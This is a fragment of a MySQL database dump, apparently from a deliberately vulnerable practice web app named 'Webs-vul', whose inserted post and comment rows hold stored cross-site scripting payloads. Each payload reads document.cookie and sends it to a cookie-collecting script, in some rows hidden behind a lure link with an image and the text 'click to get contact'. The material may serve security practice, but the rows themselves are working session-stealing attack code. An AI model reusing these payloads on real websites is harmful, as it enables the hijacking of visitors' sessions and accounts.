...
--
-- Máy chủ: 127.0.0.1
-- Thời gian đã tạo: Th6 09, 2023 lúc 09:55 AM
...
(145, 'Trung', 'Chuc', '<a href=\"#\" onclick=\"sendCookie()\"> <img src=\"../../images/gai.jpg\" witdh=\"150px\" height=\"150px\"> <br>Click để lấy contact</a> <script> function sendCookie() {   var cookieValue = document.cookie;   var encodedCookieValue = encodeURIComponent(cookieValue);   var url = \"http://localhost/Webs-vul/getCookie/get.php?cookie=\" + encodedCookieValue;   window.location.href = url; } </script>'),
(146, 'Trung', 'truong', '<a href=\"#\" onclick=\"sendCookie()\"> <img src=\"../../images/gai.jpg\" witdh=\"150px\" height=\"150px\"> <br>Click để lấy contact</a> <script> function sendCookie() {   var img = new Image(); img.src = \"http://localhost/Webs-vul/getCookie/get.php?cookie=\" + document.cookie;  } </script>');
...
(111, 3, '1', '<script> alert(\"document.cookie\");var img = new Image(); img.src = \"http://localhost/Webs-vul/getCookie/get.php?cookie=\" + document.cookie; </script>\r\n'),
(116, 2, '1', '<script> alert(\"Hacked\");var img = new Image(); img.src = \"http://localhost/Webs-vul/getCookie/get.php?cookie=\" + document.cookie; </script>');
